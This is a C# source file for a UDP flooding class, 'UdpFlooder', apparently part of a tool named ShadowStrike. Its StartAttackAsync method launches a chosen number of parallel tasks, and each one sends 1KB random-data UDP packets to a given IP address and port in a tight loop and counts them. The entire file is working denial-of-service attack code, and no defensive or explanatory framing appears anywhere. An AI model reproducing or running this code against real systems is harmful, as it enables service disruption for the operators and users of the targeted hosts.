using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class UdpFlooder
    {
        private volatile bool _isRunning;
        private long _packetsSent;
        public long PacketsSent => _packetsSent;

        public async Task StartAttackAsync(string ip, int port, int threads, CancellationToken token)
        {
            _isRunning = true;
            _packetsSent = 0;
            byte[] payload = new byte[1024]; // 1KB payload
            new Random().NextBytes(payload);

            var tasks = new Task[threads];
            for (int i = 0; i < threads; i++)
            {
                tasks[i] = Task.Run(async () =>
                {
                    using (var client = new UdpClient())
                    {
                        // Connect once to avoid repeated DNS/Routing lookups
                        try 
                        {
                            client.Connect(ip, port);
                        }
                        catch { return; }

                        while (!token.IsCancellationRequested && _isRunning)
                        {
                            try
                            {
                                await client.SendAsync(payload, payload.Length);
                                Interlocked.Increment(ref _packetsSent);
                                
                                // Prevent complete saturation of local uplink
                                // A tiny delay allows other traffic (like OS keepalives) to pass
                                await Task.Delay(1);
                            }
                            catch { }
                        }
                    }
                }, token);
            }

            await Task.WhenAll(tasks);
            _isRunning = false;
        }

        public void Stop()
        {
            _isRunning = false;
        }
    }
}
